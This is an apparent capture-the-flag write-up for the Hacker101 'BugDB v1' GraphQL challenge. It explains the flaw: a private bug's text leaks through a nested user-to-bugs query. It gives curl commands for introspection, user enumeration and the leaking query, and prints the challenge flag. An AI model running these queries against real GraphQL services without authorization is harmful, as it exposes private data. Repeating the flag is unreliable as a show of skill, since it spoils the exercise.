# BugDB v1

## Overview

This directory contains the local materials and manual walkthrough for the `BugDB v1` challenge from `Hacker101 / HackerOne CTF`. The goal of this README is to make the folder immediately useful to someone reviewing the archive later: what the challenge was about, what files matter, how the solve works at a high level, and which commands to run first.

## Challenge Profile

- Challenge: `BugDB v1`
- Category: `Web, GraphQL`
- Collection: `HackerOne`
- Event or Platform: `Hacker101 / HackerOne CTF`

## Directory Contents

- `bugdb_v1_poc.sh`

## First Commands To Run

This folder does not include original challenge files. Follow the walkthrough the same way you would read a public writeup: understand the target behavior first, then reproduce each manual step against a fresh instance until the flag is visible.

```bash
cd "/home/eliah/Desktop/CTF/HackerOne/BugDB_v1"
ls -lah
printf 'Follow the manual walkthrough below against the live service.\n'
```

## Writeup Flow

This README follows a public-writeup style structure: start from the provided files or exposed service, confirm the key weakness or clue with manual commands, use that confirmed finding to move forward, and stop only when the final flag or recovered result is visible.

When you work through it, keep asking four questions:

1. What is the challenge giving me locally or remotely?
2. What exact behavior, bug, artifact, or hidden assumption matters?
3. How do I verify that with a command or inspection step?
4. How does that verified result lead to the final flag?

## Walkthrough

Challenge: BugDB v1
Platform: Hacker101 / HackerOne CTF
Category: Web, GraphQL
Difficulty shown: Easy

Target:
https://4a00167b82df0cc4505e4e3bb8cad140.ctf.hacker101.com/

What this challenge is teaching:
GraphQL applications often look "clean" from the outside because they expose
a single endpoint, but the real attack surface is the schema behind it.
If introspection is enabled, an attacker can ask the API what objects and
fields exist, then walk the graph until they find sensitive data.

### Real-world analogy

Imagine a company hides the "private incident report" page from the website
menu, but the backend still lets any logged-out visitor ask:
"Show me every employee, and for each employee show me every incident note."
The frontend may never render that path, but GraphQL lets the client build
its own path through related objects. If authorization is missing on even one
nested field, private data leaks.

Vulnerability summary:
1. The GraphQL endpoint allows schema introspection.
2. The schema exposes:
- allUsers / findUser
- Users.bugs
- Bugs_Connection -> Bugs_ node
- Bugs_.text
3. The application marks one bug as private, but still returns its text when
queried through the nested relationship:
allUsers -> victim -> bugs -> text

### Why this matters

In secure GraphQL design, access control should be enforced on the object or
field resolver that returns sensitive data, not only in the frontend or only
on one "safe" query path. Here, the list view hides details, but another path
to the same data leaks the flag.

### Manual discovery flow

### Step 1: Confirm the GraphQL endpoint exists.

Command:
curl -s 'https://4a00167b82df0cc4505e4e3bb8cad140.ctf.hacker101.com/graphql?query=%7B__typename%7D'
Reason:
This is the smallest possible GraphQL query. If it works, the endpoint is live.

### Step 2: Introspect the Query type.

Command:
curl -sG 'https://4a00167b82df0cc4505e4e3bb8cad140.ctf.hacker101.com/graphql' \
--data-urlencode 'query=query{__type(name:"Query"){fields{name args{name type{kind name ofType{kind name}}} type{kind name ofType{kind name}}}}}'
Reason:
This reveals entry points exposed by the API. In this challenge, the useful
ones are allUsers, findUser, allBugs, and findBug.

### Step 3: Enumerate users.

Command:
curl -sG 'https://4a00167b82df0cc4505e4e3bb8cad140.ctf.hacker101.com/graphql' \
--data-urlencode 'query=query{allUsers(first:10){edges{node{id username}}}}'
Reason:
This shows who exists. We learn there are users named admin and victim.

### Step 4: Pivot into the victim's related bugs and ask for text directly.

Command:
curl -sG 'https://4a00167b82df0cc4505e4e3bb8cad140.ctf.hacker101.com/graphql' \
--data-urlencode 'query=query{findUser(username:"victim"){id username bugs(first:10){edges{node{id private text reporter{username}}}}}}'
Reason:
The key bug is an authorization flaw on a nested GraphQL relationship.
Even though the bug is marked private, the resolver still returns the text.

Expected leaked value:
^FLAG^2292a5f6acdb70c90e7aac6e066968497b4f7f029bd24b88b5bbe923bff3fa55$FLAG$

## Manual Reproduction Flow

Use the walkthrough above as the authoritative solve path. The short command block below is only the setup phase before you execute the numbered manual steps in this README.

```bash
cd "/home/eliah/Desktop/CTF/HackerOne/BugDB_v1"
ls -lah
```

## Final Flag

Following the manual path in this README leads to: `^FLAG^2292a5f6acdb70c90e7aac6e066968497b4f7f029bd24b88b5bbe923bff3fa55$FLAG$`

## Study Notes

This folder is best used as a practical study reference for `Web, GraphQL`-style problems. Enumerate the schema and test the vulnerable query paths manually first, then use the archived solve notes only as a reference check.
